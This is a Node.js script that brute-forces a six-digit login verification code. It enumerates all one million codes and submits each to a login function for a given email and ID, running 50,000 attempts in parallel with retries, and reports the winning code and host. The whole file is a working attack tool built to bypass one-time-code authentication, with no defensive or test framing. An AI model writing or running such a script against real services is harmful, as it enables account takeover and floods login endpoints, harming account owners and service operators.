const async = require("async");
const login = require("./utils/login");
const axios = require("axios");

const email = ""; // replace with actual email
const secId = ""; // replace with your logic to get the secId
const maxAttempts = 1000000; // Maximum number of attempts (10^6 for 6-digit codes)
const concurrency = 50000; // Set high concurrency for maximum performance

let totalAttempts = 0;
let successfulAttempts = 0;
let errorAttempts = 0;
let successful = false;
const startTime = Date.now();

const tryCode = async (code) => {
    if (successful) return null; // Stop further attempts if a success is found

    const maxRetries = 3;
    let attempts = 0;

    while (attempts < maxRetries) {
        try {
            let host = await login({ email: email, id: secId, code: code });
            totalAttempts++;
            if (host) {
                successfulAttempts++;
                console.log(`Logged in successfully with code: ${code}`);
                console.log(`Host: ${host}`);
                successful = true;
                return { code, success: true, host }; // Indicate success
            }
            return { code, success: false }; // Indicate failure
        } catch (error) {
            attempts++;
            errorAttempts++;
            console.error(`Error during login with code ${code}: ${error.message}`);
            if (attempts >= maxRetries) {
                console.error(`Max retries reached for code ${code}`);
            }
        }
    }
};

const main = async () => {
    const codes = Array.from({ length: maxAttempts }, (_, i) => i.toString().padStart(6, '0'));

    const queue = async.queue(async (code, callback) => {
        await tryCode(code);
        callback();
    }, concurrency);

    queue.drain = () => {
        console.log(`Final statistics:
        Total attempts: ${totalAttempts}
        Successful attempts: ${successfulAttempts}
        Error attempts: ${errorAttempts}`);
        console.log(`Elapsed time: ${(Date.now() - startTime) / 1000} seconds`);

        if (!successful) {
            console.log("All attempts completed without success.");
        }
        console.log("Done.");
    };

    codes.forEach(code => queue.push(code));

    // Log statistics periodically
    setInterval(() => {
        console.log(`Total attempts: ${totalAttempts}`);
        console.log(`Successful attempts: ${successfulAttempts}`);
        console.log(`Error attempts: ${errorAttempts}`);
        console.log(`Elapsed time: ${(Date.now() - startTime) / 1000} seconds`);
    }, 10000); // Every 10 seconds
};

main();
